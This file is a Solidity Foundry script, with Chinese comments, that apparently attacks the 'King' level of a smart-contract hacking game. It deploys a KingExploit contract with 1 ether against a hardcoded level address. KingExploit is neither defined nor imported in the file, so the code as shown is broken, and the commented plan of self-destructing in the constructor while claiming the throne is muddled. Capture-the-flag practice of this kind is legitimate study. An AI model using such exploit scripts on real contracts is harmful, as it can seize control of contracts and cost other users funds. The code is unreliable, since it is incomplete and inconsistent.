// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IKing {
    function king() external view returns (address);
    function claimThrone() external payable;
}

contract KingAttack is Script {
    function run() external {
        // King 关卡地址
        address kingLevel = 0xdaEa6E829a45F3bF1C0C455aa387D7dBD57F1aAF;

        // 开始广播交易
        vm.startBroadcast();

        // 部署攻击合约，在构造函数中自毁并调用 claimThrone
        KingExploit exploit = new KingExploit{value: 1 ether}(payable(kingLevel));

        // 停止广播
        vm.stopBroadcast();
    }
}